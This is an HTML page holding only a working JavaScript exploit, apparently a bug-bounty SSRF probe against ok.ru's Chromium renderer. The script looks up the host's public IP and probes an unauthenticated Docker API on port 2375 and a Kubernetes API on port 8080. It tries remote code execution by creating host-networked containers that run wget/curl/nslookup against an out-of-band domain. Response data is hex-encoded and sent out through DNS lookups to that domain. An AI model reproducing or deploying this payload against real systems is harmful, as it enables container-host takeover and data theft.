<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>OK</title></head>
<body>
<script>
'use strict';
// ok.ru Chromium SSRF — probe v6 (deployed as v5 URL)
// Key new ideas:
//   A) WebSocket to Docker API: WS doesn't enforce CORS body restriction → CAN READ response data
//   B) Host-network containers: uses host's internet access directly (no NAT/bridge firewall)
//   C) Multiple images: busybox/alpine/ubuntu/debian/node
//   D) Public IP bypass (from v5): public→public avoids Chrome PNA

const OOB = 'd9kjf7b6b8m9jk7s693gjsxj13ripi6b4.oast.pro';
const T0 = Date.now();

const clean = (s) => s.toLowerCase().replace(/[^a-z0-9-]/g,'').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,60);

const dnsOob = (label) => {
  const l = clean(label);
  new Image().src = `https://${l}.${OOB}/`;
  fetch(`https://${l}.${OOB}/`, { mode: 'no-cors', signal: AbortSignal.timeout(3000) }).catch(() => {});
};

const errCode = (e) => {
  if (!e) return 'unk';
  const n = e.name || '';
  const m = (e.message || '').substring(0, 40).toLowerCase();
  if (n === 'AbortError') return 'time';
  if (n === 'TypeError' && m.includes('cors')) return 'cors';
  if (n === 'TypeError' && m.includes('failed')) return 'te-ff';
  if (n === 'TypeError') return 'te';
  if (n === 'NetworkError') return 'ne';
  return n.substring(0,4).toLowerCase();
};

// CORS fetch — 'cors' error = server responded; body exfiltrated via DNS if readable
const probe = async (lp, url, ms = 6000) => {
  const t0 = Date.now();
  try {
    const r = await fetch(url, { signal: AbortSignal.timeout(ms) });
    const body = await r.text();
    const elapsed = Date.now() - t0;
    const snip = body.substring(0, 8).replace(/[^a-z0-9]/gi,'').toLowerCase().substring(0,8);
    dnsOob(`${lp}-ok-${r.status}-${elapsed}ms-${snip}`);
    if (body.length > 0) {
      const hex = Array.from(new TextEncoder().encode(body.substring(0, 120)))
        .map(b => b.toString(16).padStart(2,'0')).join('');
      (hex.match(/.{1,50}/g) || []).forEach((c,i) => dnsOob(`${lp}-b${i}-${c}`));
    }
  } catch (e) {
    dnsOob(`${lp}-err-${errCode(e)}-${Date.now()-t0}ms`);
  }
};

// no-cors POST — delivers body without preflight; nc-ok = any HTTP response received
const ncProbe = async (lp, url, method = 'GET', body = null, ms = 6000) => {
  const t0 = Date.now();
  const opts = { method, mode: 'no-cors', signal: AbortSignal.timeout(ms) };
  if (body !== null) opts.body = body;
  try {
    await fetch(url, opts);
    dnsOob(`${lp}-nc-ok-${Date.now()-t0}ms`);
  } catch (e) {
    dnsOob(`${lp}-nc-err-${errCode(e)}-${Date.now()-t0}ms`);
  }
};

// WebSocket probe — WS onmessage CAN read cross-origin data (no CORS body restriction)
const wsProbe = (lp, wsUrl, ms = 8000) => new Promise(resolve => {
  let done = false;
  const finish = (tag) => { if (!done) { done = true; dnsOob(tag); resolve(); } };
  try {
    const ws = new WebSocket(wsUrl);
    const timer = setTimeout(() => { ws.close(); finish(`${lp}-ws-time`); }, ms);
    ws.onopen = () => { dnsOob(`${lp}-ws-open`); };
    ws.onmessage = (e) => {
      clearTimeout(timer);
      const d = (typeof e.data === 'string' ? e.data : '').substring(0, 100);
      dnsOob(`${lp}-ws-msg-${clean(d)}`);
      // Exfil first 80 chars of WS message via DNS (actual Docker data!)
      if (d.length > 0) {
        const hex = Array.from(new TextEncoder().encode(d.substring(0,80)))
          .map(b => b.toString(16).padStart(2,'0')).join('');
        (hex.match(/.{1,50}/g) || []).forEach((c,i) => dnsOob(`${lp}-wd${i}-${c}`));
      }
      ws.close();
      finish(`${lp}-ws-done`);
    };
    ws.onerror = () => finish(`${lp}-ws-err`);
    ws.onclose = (e) => finish(`${lp}-ws-cls-${e.code}`);
  } catch(e) {
    finish(`${lp}-ws-exc-${errCode(e)}`);
  }
});

// Try container create+start with a given image; use host network for OOB
const tryRce = async (ip, img, lp) => {
  const safeName = `rce6-${img.replace(/[^a-z0-9]/g,'').substring(0,10)}`;
  const oobLabel = `v6rce-${img.replace(/[^a-z0-9]/g,'').substring(0,10)}`;
  const createBody = JSON.stringify({
    Image: img,
    // sh -c fallback: try wget, curl, or nslookup for OOB
    Cmd: ['sh', '-c', `wget -q -T 5 "http://${oobLabel}.${OOB}/" 2>/dev/null || curl -sk "http://${oobLabel}.${OOB}/" 2>/dev/null; nslookup "${oobLabel}.${OOB}" 2>/dev/null`],
    HostConfig: { NetworkMode: 'host' }  // host network = host's internet access
  });
  await ncProbe(`${lp}-cr`, `http://${ip}:2375/containers/create?name=${safeName}`, 'POST', createBody, 8000);
  await new Promise(r => setTimeout(r, 300));
  await ncProbe(`${lp}-st`, `http://${ip}:2375/containers/${safeName}/start`, 'POST', '', 8000);
};

(async () => {
  dnsOob(`exec-v6-${clean(navigator.userAgent.substring(0,40))}`);

  // ── Step 1: Get Chromium's public IP ─────────────────────────────────────
  let myIP = null;
  try {
    const r = await fetch('https://api.ipify.org/?format=text', { signal: AbortSignal.timeout(10000) });
    myIP = (await r.text()).trim();
    dnsOob(`myip-${myIP.replace(/\./g,'-')}`);
  } catch(e) {
    dnsOob(`myip-err-${errCode(e)}`);
    try {
      const r2 = await fetch('https://checkip.amazonaws.com/', { signal: AbortSignal.timeout(10000) });
      myIP = (await r2.text()).trim();
      dnsOob(`myip2-${myIP.replace(/\./g,'-')}`);
    } catch(e2) { dnsOob(`myip2-err-${errCode(e2)}`); }
  }

  // Work with both IPs: private (172.17.0.1) and public (bypasses PNA)
  const targets = [];
  if (myIP) targets.push({ ip: myIP, tag: 'pub' });
  targets.push({ ip: '172.17.0.1', tag: 'priv' });

  for (const { ip, tag } of targets) {
    dnsOob(`v6-start-${tag}`);

    // ── Step 2: Probe Docker /_ping ──────────────────────────────────────
    await probe(`${tag}-dp`, `http://${ip}:2375/_ping`, 8000);

    // ── Step 3: WebSocket to Docker /events — reads cross-origin data! ──
    // Docker /events is a streaming endpoint; WS upgrade may be accepted
    await wsProbe(`${tag}-ev`, `ws://${ip}:2375/events`, 7000);

    // ── Step 4: Read /containers/json and /images/json ────────────────
    await probe(`${tag}-cj`, `http://${ip}:2375/containers/json?all=1`, 8000);
    await probe(`${tag}-ij`, `http://${ip}:2375/images/json`, 8000);
    await probe(`${tag}-ver`, `http://${ip}:2375/version`, 8000);

    // ── Step 5: RCE — try multiple images with host networking ─────────
    const images = ['busybox', 'alpine', 'ubuntu', 'debian', 'python3', 'node', 'curl'];
    for (let i = 0; i < images.length; i++) {
      await tryRce(ip, images[i], `${tag}-${i}`);
      await new Promise(r => setTimeout(r, 500));
    }

    // Wait for container wget/nslookup (host net = host OOB access)
    await new Promise(r => setTimeout(r, 10000));
    dnsOob(`v6-rce-wait-${tag}-done`);

    // ── Step 6: K8s API ──────────────────────────────────────────────────
    await probe(`${tag}-kapi`, `http://${ip}:8080/api`, 7000);
    await probe(`${tag}-kver`, `http://${ip}:8080/version`, 7000);
  }

  dnsOob(`done-v6-${Date.now()-T0}ms`);
})();
</script>
</body>
</html>
